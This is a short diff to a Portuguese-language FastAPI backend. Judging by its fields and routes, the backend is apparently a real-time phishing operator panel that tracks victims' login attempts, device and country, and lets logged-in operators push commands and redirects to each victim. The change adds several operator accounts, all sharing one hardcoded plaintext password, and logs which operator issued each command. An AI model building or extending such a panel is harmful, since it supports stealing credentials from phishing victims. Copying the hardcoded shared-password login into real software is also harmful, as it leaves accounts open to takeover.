@@ -120,7 +120,8 @@ class LoginAttempt(BaseModel):
     country: Optional[str] = None
     device: Optional[str] = None
     page: Optional[str] = "Página Loading..."
-    current_action: Optional[str] = None  # Para armazenar o comando atual
+    current_action: Optional[str] = None
+    operated_by: Optional[str] = None
     action_timestamp: Optional[str] = None
     redirect_url: Optional[str] = None
     # Campos para armazenar dados recebidos dos comandos
@@ -209,12 +210,17 @@ async def notify_email_typing(data: EmailTypingNotification):
     return {"message": "Notificação enviada"}
 
 # Admin Routes
+ADMIN_USERS = {
+    "donas": "Seinao10@@",
+    "pk": "Seinao10@@",
+    "web": "Seinao10@@"
+}
+
 @api_router.post("/admin/login")
 async def admin_login(credentials: AdminLogin):
-    # Credenciais fixas: donas / 102030al
-    if credentials.username == "donas" and credentials.password == "Seinao10@@":
+    if credentials.username in ADMIN_USERS and credentials.password == ADMIN_USERS[credentials.username]:
         token = create_access_token({"sub": credentials.username})
-        return {"access_token": token, "token_type": "bearer"}
+        return {"access_token": token, "token_type": "bearer", "username": credentials.username}
     raise HTTPException(status_code=401, detail="Credenciais inválidas")
 
 @api_router.get("/admin/login-attempts", response_model=List[LoginAttempt])
@@ -303,9 +309,11 @@ async def send_command(command: CommandRequest, token_data: dict = Depends(verif
         return {"message": "Comando limpo com sucesso"}
     
     # Atualizar o comando atual do usuário com timestamp
+    operator = token_data.get("sub", "unknown")
     update_data = {
         "current_action": command.command,
-        "action_timestamp": datetime.now(timezone.utc).isoformat()
+        "action_timestamp": datetime.now(timezone.utc).isoformat(),
+        "operated_by": operator
     }
     
     # Salvar referência se fornecida
